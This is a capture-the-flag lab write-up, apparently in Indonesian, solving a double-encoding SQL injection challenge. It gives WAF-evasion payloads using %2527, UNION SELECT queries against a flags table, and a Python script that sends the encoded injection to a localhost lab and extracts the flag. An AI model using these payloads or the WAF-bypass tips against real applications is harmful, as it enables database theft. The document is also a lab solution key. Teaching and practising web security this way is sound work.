# Lab H3 - Double Encoding SQL Injection (Hard)

## Informasi Lab
- **Endpoint**: `/stats.php?id=`
- **Tipe**: Double Encoding Injection
- **Hint**: Encoded param - %2527

## Analisis

### 1. Double Decoding
```php
$id = isset($_GET['id']) ? $_GET['id'] : '1';
$id = urldecode($id);  // First decode
$id = urldecode($id);  // Second decode
```

### 2. Encoding Explanation
- `%27` = single quote `'` (setelah 1x decode)
- `%2527` = `%27` (setelah 1x decode) = `'` (setelah 2x decode)

### 3. Bypass via Double Encoding
Jika ada WAF yang memfilter `%27`, gunakan `%2527`:
- Browser tidak decode `%2527`
- WAF melihat `%2527` (bukan single quote)
- PHP melakukan double decode → `'`

## Solusi

### Langkah 1 - Test Basic Injection
```
?id=1%2527
```
Setelah double decode: `1'`

### Langkah 2 - Konfirmasi Vulnerable
```
?id=1%2527 OR 1=1--%2520-
```
Setelah double decode: `1' OR 1=1-- -`

### Langkah 3 - UNION Injection
```
?id=-1%2527 UNION SELECT 1,flag FROM flags--%2520-
```

### Encoding Helper

```python
import urllib.parse

def double_encode(payload):
    return urllib.parse.quote(urllib.parse.quote(payload))

payload = "' UNION SELECT 1,flag FROM flags-- -"
encoded = double_encode(payload)
print(f"Double encoded: {encoded}")
```

### Manual Double Encoding Table

| Char | Single Encode | Double Encode |
|------|---------------|---------------|
| `'`  | `%27`         | `%2527`       |
| ` `  | `%20`         | `%2520`       |
| `-`  | `%2D`         | `%252D`       |
| `=`  | `%3D`         | `%253D`       |

### Payload Final
```
http://localhost/h3/stats.php?id=-1%2527 UNION SELECT 1,flag FROM flags--%2520-
```

### Script Python

```python
import requests
import urllib.parse

url = "http://localhost/h3/stats.php"

def double_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s))

# Payload
payload = "-1' UNION SELECT 1,flag FROM flags-- -"
encoded_payload = double_encode(payload)

r = requests.get(f"{url}?id={encoded_payload}")
print(r.text)

# Extract flag from response
import re
flag_match = re.search(r'IDS\{[A-Z0-9]{14}\}', r.text)
if flag_match:
    print(f"Flag: {flag_match.group()}")
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Double encoding berguna untuk bypass WAF
- WAF biasanya hanya decode sekali
- Perhatikan berapa kali aplikasi melakukan decode
- Bisa juga kombinasi dengan encoding lain (hex, unicode)
